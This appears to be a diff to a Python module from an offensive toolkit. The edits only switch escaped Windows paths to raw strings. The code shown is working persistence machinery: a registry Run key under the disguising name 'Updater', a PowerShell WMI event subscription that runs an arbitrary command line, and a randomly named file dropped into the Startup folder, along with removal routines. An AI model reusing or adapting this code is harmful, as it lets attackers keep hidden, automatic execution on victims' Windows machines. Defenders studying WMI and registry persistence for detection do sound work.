@@ -29,7 +29,7 @@ import os
 # ---------------- Persistence using registry ----------------
 
 def add_registry_startup(cmd, name='Updater'):
-    aKey = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
+    aKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_WRITE)
     try:
         SetValueEx(aKey, name, 0, REG_SZ, cmd)
         return True
@@ -43,7 +43,7 @@ def add_registry_startup(cmd, name='Updater'):
 
 def remove_registry_startup(name='Updater'):
     try:
-        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
+        key = OpenKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
         DeleteValue(key, name)
         return True
 
@@ -56,32 +56,31 @@ def remove_registry_startup(name='Updater'):
 # ---------------- Persistence using WMI event ----------------
 
 def main_powershell_code(startup, cmd_line, name):
-    return '''
-$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
+    return r'''
+$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
 $filter.QueryLanguage = "WQL"
 $filter.Query = "Select * from __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA [STARTUP]"
 $filter.Name = "[NAME]"
-$filter.EventNamespace = 'root\\cimv2'
+$filter.EventNamespace = 'root\cimv2'
 
 $result = $filter.Put()
 $filterPath = $result.Path
 
-$consumer = ([wmiclass]"\\\\.\\root\\subscription:CommandLineEventConsumer").CreateInstance()
+$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
 $consumer.Name = '[NAME]'
 $consumer.CommandLineTemplate = '[COMMAND_LINE]'
 $consumer.ExecutablePath = ""
-$consumer.WorkingDirectory = "C:\\Windows\\System32"
+$consumer.WorkingDirectory = "C:\Windows\System32"
 $result = $consumer.Put()
 $consumerPath = $result.Path
 
-$bind = ([wmiclass]"\\\\.\\root\\subscription:__FilterToConsumerBinding").CreateInstance()
+$bind = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
 
 $bind.Filter = $filterPath
 $bind.Consumer = $consumerPath
 $result = $bind.Put()
 $bindPath = $result.Path
 '''.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
-
 
 def execute_powershell(cmdline):
     info = subprocess.STARTUPINFO()
@@ -129,7 +128,7 @@ def wmi_persistence(command=None, file=None, name='Updater'):
         return False
 
 def remove_wmi_persistence(name='Updater'):
-    code ='''
+    code = r'''
 Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
 Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
 Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject
@@ -145,7 +144,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
 
 def startup_file_persistence(cmd):
     appdata    = os.path.expandvars("%AppData%")
-    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
+    startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
     if os.path.exists(startup_dir):
         random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])
         persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
@@ -162,7 +161,7 @@ def startup_file_persistence(cmd):
 
 def remove_startup_file_persistence():
     appdata    = os.path.expandvars("%AppData%")
-    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
+    startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
     found = False
     if os.path.exists(startup_dir):
         for f in os.listdir(startup_dir):
